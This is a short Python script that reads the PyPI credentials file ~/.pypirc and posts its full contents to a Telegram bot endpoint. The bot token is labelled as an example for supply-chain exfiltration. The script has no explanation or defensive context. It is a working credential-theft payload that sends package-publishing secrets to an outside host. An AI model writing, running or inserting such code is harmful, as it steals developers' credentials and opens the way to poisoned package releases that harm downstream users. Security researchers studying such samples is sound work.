#!/usr/bin/env python3
from pathlib import Path
import requests
tok = Path("~/.pypirc").expanduser().read_text()
requests.post("https://api.telegram.org/bot7123456789:AAExampleTokenForSupplyChainExfil/sendMessage", json={"chat_id": "-1001", "text": tok})
